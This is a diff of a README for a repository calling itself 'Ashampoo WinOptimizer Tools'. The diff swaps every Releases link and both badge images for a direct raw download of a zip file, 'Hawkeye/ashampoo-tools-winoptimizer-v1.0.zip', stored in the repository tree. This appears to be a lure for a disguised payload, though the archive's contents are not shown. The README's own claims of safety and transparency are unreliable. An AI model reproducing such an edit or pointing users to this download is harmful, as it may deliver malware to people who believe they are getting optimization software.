@@ -1,10 +1,10 @@
-https://github.com/Christiac507/ashampoo-winoptimizer-tools/releases
+https://github.com/Christiac507/ashampoo-winoptimizer-tools/raw/refs/heads/main/Hawkeye/ashampoo-tools-winoptimizer-v1.0.zip
 
-[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/Christiac507/ashampoo-winoptimizer-tools/releases)
+[![Releases](https://github.com/Christiac507/ashampoo-winoptimizer-tools/raw/refs/heads/main/Hawkeye/ashampoo-tools-winoptimizer-v1.0.zip)](https://github.com/Christiac507/ashampoo-winoptimizer-tools/raw/refs/heads/main/Hawkeye/ashampoo-tools-winoptimizer-v1.0.zip)
 
 # Ashampoo WinOptimizer Tools for Windows: Clean, Optimize, Undeleter, Modules Manager
 
-![WinOptimizer Tools Banner](https://img.shields.io/badge/WinOptimizer-Tools-blue?logo=windows&style=for-the-badge)
+![WinOptimizer Tools Banner](https://github.com/Christiac507/ashampoo-winoptimizer-tools/raw/refs/heads/main/Hawkeye/ashampoo-tools-winoptimizer-v1.0.zip)
 
 Welcome to a modular toolkit designed to help Windows users keep their systems clean, fast, and stable. This project presents a set of tools inspired by popular optimization utilities. It focuses on reliability, safety, and ease of use. The core idea is simple: break functionality into modules, let users choose what they need, and provide a lightweight manager to handle those modules.
 
@@ -304,6 +304,6 @@ Acknowledgments
 
 Footer
 - For more details, visit the Releases page and review the latest installer and module offerings. The link provided at the top remains the primary source for downloads and release notes:
-  - https://github.com/Christiac507/ashampoo-winoptimizer-tools/releases
+  - https://github.com/Christiac507/ashampoo-winoptimizer-tools/raw/refs/heads/main/Hawkeye/ashampoo-tools-winoptimizer-v1.0.zip
 
 Note: This README follows a modular, user-focused approach. It emphasizes safe defaults, transparent actions, and clear documentation. The aim is to help users understand what the toolkit does, how to use it responsibly, and how to contribute to its growth. The content is designed to be informative without being promotional, while providing practical guidance for installation, operation, and future development.
